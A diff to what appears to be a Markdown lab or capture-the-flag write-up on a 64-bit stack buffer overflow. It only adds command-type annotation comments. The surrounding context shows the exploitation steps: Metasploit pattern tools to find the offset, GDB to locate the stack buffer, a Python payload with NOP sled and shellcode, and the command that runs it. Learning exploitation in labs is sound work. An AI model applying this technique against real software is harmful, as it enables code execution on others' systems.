@@ -27,6 +27,7 @@ A classic 64-bit stack buffer overflow where an attacker overwrites the saved in
 ### 1. Calculate the Offset
 
 Generate a pattern and crash the binary in GDB:
+<!-- cmd: linux -->
 ```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 700
 gdb ./binary
@@ -35,6 +36,7 @@ gdb ./binary
 ```
 
 Read the crashed RBP/RIP value and find the offset:
+<!-- cmd: linux -->
 ```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 700 -q 0x<crashed_value>
 ```
@@ -43,6 +45,7 @@ Read the crashed RBP/RIP value and find the offset:
 ### 2. Find the Buffer Address
 
 Set a breakpoint at the vulnerable function's `ret` instruction to inspect the live stack pointer (`RSP`):
+<!-- cmd: linux -->
 ```bash
 (gdb) disassemble main
 (gdb) break *<ret_address>
@@ -54,6 +57,7 @@ Set a breakpoint at the vulnerable function's `ret` instruction to inspect the l
 
 Construct a payload consisting of a NOP sled (to improve reliability), the shellcode, padding up to the offset, and the target return address pointing into the NOP sled.
 
+<!-- cmd: python -->
 ```python
 import struct
 
@@ -78,6 +82,7 @@ with open("payload.bin", "wb") as f:
 
 ### 4. Execute
 
+<!-- cmd: linux -->
 ```bash
 (cat payload.bin; cat) | ./binary
 ```
